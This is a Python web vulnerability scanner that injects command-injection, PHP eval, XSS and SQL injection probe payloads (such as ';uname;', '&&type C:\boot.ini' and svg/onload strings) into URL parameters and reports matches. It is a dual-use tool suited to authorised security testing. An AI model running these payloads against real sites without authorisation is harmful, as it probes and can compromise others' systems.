#!/usr/bin/env python3
# SecureWeb Scan is a Web Applications Security Scanner

import re
import time
import urllib.request
from headers import *

# ANSI color codes (define if not already)
class ga:
    green = '\033[92m'
    red = '\033[91m'
    blue = '\033[94m'
    bold = '\033[1m'
    end = '\033[0m'

# Use a global opener with custom headers (like a browser)
useragent = urllib.request.build_opener()
useragent.addheaders = [('User-agent', 'Mozilla/5.0')]

def main_function(url, payloads, check):
    vuln = 0

    try:
        response = useragent.open(url)
        if response.getcode() == 999:
            print(ga.red + " [~] WebKnight WAF Detected!" + ga.end)
            print(ga.red + " [~] Delaying 3 seconds between every request" + ga.end)
            time.sleep(3)
    except Exception as e:
        print(ga.red + f" [!] Failed to open URL: {e}" + ga.end)
        return

    for params in url.split("?")[1].split("&"):
        for payload in payloads:
            bugged_url = url.replace(params, params + str(payload).strip())

            try:
                request = useragent.open(bugged_url)
                html = request.read().decode(errors="ignore").splitlines()
            except Exception as e:
                continue  # silently skip failed requests

            for line in html:
                checker = re.findall(check, line)
                if checker:
                    print(ga.red + " [*] Payload Found . . ." + ga.end)
                    print(ga.red + " [*] Payload: ", payload + ga.end)
                    print(ga.green + " [!] Code Snippet: " + ga.end + line.strip())
                    print(ga.blue + " [*] POC: " + ga.end + bugged_url)
                    print(ga.green + " [*] Happy Exploitation :D" + ga.end)
                    vuln += 1

    if vuln == 0:
        print(ga.green + " [!] Target is not vulnerable!" + ga.end)
    else:
        print(ga.blue + f" [!] Congratulations you've found {vuln} bugs :-) " + ga.end)


def rce_func(url):
    headers_reader(url)
    print(ga.bold + " [!] Now Scanning for Remote Code/Command Execution " + ga.end)
    print(ga.blue + " [!] Covering Linux & Windows Operating Systems " + ga.end)
    print(ga.blue + " [!] Please wait ...." + ga.end)

    payloads = [';${@print(md5(zigoo0))}', ';${@print(md5("zigoo0"))}']
    payloads += ['%253B%2524%257B%2540print%2528md5%2528%2522zigoo0%2522%2529%2529%257D%253B']
    payloads += [';uname;', '&&dir', '&&type C:\\boot.ini', ';phpinfo();', ';phpinfo']
    check = re.compile(r"51107ed95250b4099a0f481221d56497|Linux|eval\(\)|SERVER_ADDR|Volume.+Serial|\[boot", re.I)

    main_function(url, payloads, check)


def xss_func(url):
    print(ga.bold + "\n [!] Now Scanning for XSS " + ga.end)
    print(ga.blue + " [!] Please wait ...." + ga.end)

    payloads = [
        '%27%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb',
        '%78%22%78%3e%78',
        '%22%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb',
        'zigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb'
    ]
    check = re.compile(r'zigoo0<svg|x>x', re.I)

    main_function(url, payloads, check)


def error_based_sqli_func(url):
    print(ga.bold + "\n [!] Now Scanning for Error Based SQL Injection " + ga.end)
    print(ga.blue + " [!] Covering MySQL, Oracle, MSSQL, MSACCESS & PostGreSQL Databases " + ga.end)
    print(ga.blue + " [!] Please wait ...." + ga.end)

    payloads = [
        "3'", "3%5c", "3%27%22%28%29", "3'><",
        "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"
    ]
    check = re.compile(
        r"Incorrect syntax|Syntax error|Unclosed.+mark|unterminated.+qoute|SQL.+Server|Microsoft.+Database|Fatal.+error",
        re.I
    )

    main_function(url, payloads, check)
